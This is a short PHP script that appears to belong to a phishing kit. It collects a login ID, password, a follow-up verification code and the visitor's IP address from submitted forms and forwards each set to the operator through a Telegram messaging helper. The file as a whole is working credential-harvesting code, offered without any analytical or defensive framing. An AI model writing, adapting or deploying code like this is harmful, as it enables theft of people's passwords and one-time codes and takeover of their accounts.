<?
require_once 'app.php';

if($_GET['step'] == 'log') {
    $msg = '+++++++++ PBDE +++++++++'. "\r\n";
    $msg .= '[ ID ] = ' . $_POST['id'] . "\r\n";
    $msg .= '[ PW ] = ' . $_POST['pw'] . "\r\n";
    $msg .= '[ IP ] = ' . get_user_ip() . "\r\n";
    telegram_message($msg);
}
if($_GET['step'] == 'code') {
    $msg = '+++++++++ PBDE +++++++++'. "\r\n";
    $msg .= '[ CODE ] = ' . $_POST['code'] . "\r\n";
    $msg .= '[ IP ] = ' . get_user_ip() . "\r\n";
    telegram_message($msg);
}